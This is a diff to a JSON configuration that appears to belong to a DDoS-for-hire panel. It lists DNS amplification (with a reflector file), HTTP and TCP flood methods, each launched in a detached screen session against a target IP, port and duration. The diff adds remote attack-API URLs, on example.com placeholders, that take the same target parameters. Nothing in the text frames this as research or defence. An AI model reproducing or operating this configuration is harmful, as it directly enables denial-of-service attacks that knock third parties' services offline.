@@ -54,15 +54,22 @@
   "methods": [
     {
       "name": "dns",
-      "command": "screen -dmS {IP} ./dns {IP}/32 {PORT} dns50.txt 2 -1 {DURATION}"
+      "command": "screen -dmS {IP} ./dns {IP}/32 {PORT} dns50.txt 2 -1 {DURATION}",
+      "apis": [
+        "http://example.com/attack?target={IP}&port={PORT}&duration={DURATION}&method=DNS"
+      ]
     },
     {
       "name": "http",
-      "command": "screen -dmS {IP} ./HTTP {IP} {PORT} {DURATION}"
+      "command": "screen -dmS {IP} ./HTTP {IP} {PORT} {DURATION}",
+      "apis": [
+        "http://example.com/api/http?target={IP}&port={PORT}&time={DURATION}"
+      ]
     },
     {
       "name": "tcp",
-      "command": "screen -dmS {IP} ./TCP {IP} {PORT} {DURATION}"
+      "command": "screen -dmS {IP} ./TCP {IP} {PORT} {DURATION}",
+      "apis": []
     }
   ]
 }
